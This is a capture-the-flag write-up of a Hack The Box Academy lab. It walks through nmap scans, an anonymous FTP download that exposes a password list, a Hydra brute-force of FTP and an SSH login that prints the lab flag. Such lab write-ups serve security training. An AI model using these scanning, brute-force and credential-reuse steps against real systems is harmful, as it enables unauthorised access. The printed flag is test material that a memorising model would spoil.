---
title: "HTB Academy | Attacking Common Services lab 2"
description: "This is a medium lab writeup from the htb module attacking common services"
pubDate: "Nov 17 2024"
heroImage: "https://academy.hackthebox.com/storage/modules/116/logo.png?t=1730242916"
badge: "Medium"
tags: ["ftp", "bruteforcing", "information-leakage","Linux"]
---

- 1. Nmap scan:

```sh
sudo nmap -sS -p- --open --min-rate -Pn -n -vvv $target -oG allports
```

- Output:
```
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sun Nov 17 02:43:55 2024 as: /usr/lib/nmap/nmap -sS --min-rate 5000 -p- --open -Pn -n -vvv -oG allPorts 10.129.170.25
       │ 3
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 10.129.170.253 () Status: Up
   4   │ Host: 10.129.170.253 () Ports: 22/open/tcp//ssh///, 53/open/tcp//domain///, 110/open/tcp//pop3///, 995/open/tcp//pop3s///, 2121/open/tcp//ccproxy-f
       │ tp///, 30021/open/tcp/////
   5   │ # Nmap done at Sun Nov 17 02:44:10 2024 -- 1 IP address (1 host up) scanned in 15.17 seconds
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 
```

- 1.2 Scripts and services:

```sh
nmap -sCV -p 22,53,110,995,2121,30021 $target -oN targeted
```

```powershell
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sun Nov 17 02:44:57 2024 as: /usr/lib/nmap/nmap --privileged -sCV -p22,53,110,995,2121,30021 -oN target 10.129.170.25
       │ 3
   2   │ Nmap scan report for 10.129.170.253
   3   │ Host is up (0.21s latency).
   4   │ 
   5   │ PORT      STATE SERVICE      VERSION
   6   │ 22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
   9   │ |   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
  10   │ |_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
  11   │ 53/tcp    open  domain       ISC BIND 9.16.1 (Ubuntu Linux)
  12   │ | dns-nsid: 
  13   │ |_  bind.version: 9.16.1-Ubuntu
  14   │ 110/tcp   open  pop3         Dovecot pop3d
  15   │ |_pop3-capabilities: CAPA UIDL RESP-CODES SASL(PLAIN) AUTH-RESP-CODE PIPELINING TOP USER STLS
  16   │ |_ssl-date: TLS randomness does not represent time
  17   │ | ssl-cert: Subject: commonName=ubuntu
  18   │ | Subject Alternative Name: DNS:ubuntu
  19   │ | Not valid before: 2022-04-11T16:38:55
  20   │ |_Not valid after:  2032-04-08T16:38:55
  21   │ 995/tcp   open  ssl/pop3     Dovecot pop3d
  22   │ | ssl-cert: Subject: commonName=ubuntu
  23   │ | Subject Alternative Name: DNS:ubuntu
  24   │ | Not valid before: 2022-04-11T16:38:55
  25   │ |_Not valid after:  2032-04-08T16:38:55
  26   │ |_pop3-capabilities: CAPA UIDL RESP-CODES USER SASL(PLAIN) TOP AUTH-RESP-CODE PIPELINING
  27   │ |_ssl-date: TLS randomness does not represent time
  28   │ 2121/tcp  open  ccproxy-ftp?
  29   │ | fingerprint-strings: 
  30   │ |   GenericLines: 
  31   │ |     220 ProFTPD Server (InlaneFTP) [10.129.170.253]
  32   │ |     Invalid command: try being more creative
  33   │ |_    Invalid command: try being more creative
  34   │ 30021/tcp open  ftp
  35   │ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  36   │ |_drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
  37   │ | fingerprint-strings: 
  38   │ |   GenericLines: 
  39   │ |     220 ProFTPD Server (Internal FTP) [10.129.170.253]
  40   │ |     Invalid command: try being more creative
  41   │ |_    Invalid command: try being more creative
  42   │ 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-b
       │ in/submit.cgi?new-service :
  43   │ ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
  44   │ SF-Port2121-TCP:V=7.94SVN%I=7%D=11/17%Time=673982E5%P=x86_64-pc-linux-gnu%
  45   │ SF:r(GenericLines,8D,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.1
  46   │ SF:29\.170\.253\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x2
  47   │ SF:0creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
  48   │ SF:tive\r\n");
  49   │ ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
  50   │ SF-Port30021-TCP:V=7.94SVN%I=7%D=11/17%Time=673982E5%P=x86_64-pc-linux-gnu
  51   │ SF:%r(GenericLines,90,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20
  52   │ SF:\[10\.129\.170\.253\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20
  53   │ SF:more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\
  54   │ SF:x20creative\r\n");
  55   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  56   │ 
  57   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  58   │ # Nmap done at Sun Nov 17 02:48:27 2024 -- 1 IP address (1 host up) scanned in 209.35 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────
```

- 2. Download all files as anonymous on port 30021:

```sh
wget -m --no-passive ftp://anonymous:anonymous@$target:30021
```

- 3. Crawling

```python
❯ tree
  -  .
179 ├──  .listing
  - └──  simon
185     ├──  .listing
153     └──  mynotes.txt
```


``` python
❯ cat mynotes.txt
───────┬─────────────────────────────────
       │ File: mynotes.txt
───────┼─────────────────────────────────
   1   │ 234987123948729384293
   2   │ +23358093845098
   3   │ ThatsMyBigDog
   4   │ Rock!ng#May
   5   │ Puuuuuh7823328
   6   │ 8Ns8j1b!23hs4921smHzwn
   7   │ 237oHs71ohls18H127!!9skaP
   8   │ 238u1xjn1923nZGSb261Bs81
───────┴─────────────────────────────────
```

- 4. Hydra Brute forcing:

```python
❯ hydra -l simon -P 10.129.170.253:30021/simon/mynotes.txt ftp://10.129.170.253:2121

[DATA] attacking ftp://10.129.170.253:2121/
[2121][ftp] host: 10.129.170.253   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
```

- 5. ssh validate credentials

```sh
❯ ssh simon@10.129.170.253

simon@lin-medium:~$ ls
flag.txt  Maildir
simon@lin-medium:~$ cat flag.txt 
HTB{1qay2wsx3EDC4rfv_M3D1UM}
simon@lin-medium:~$ 

```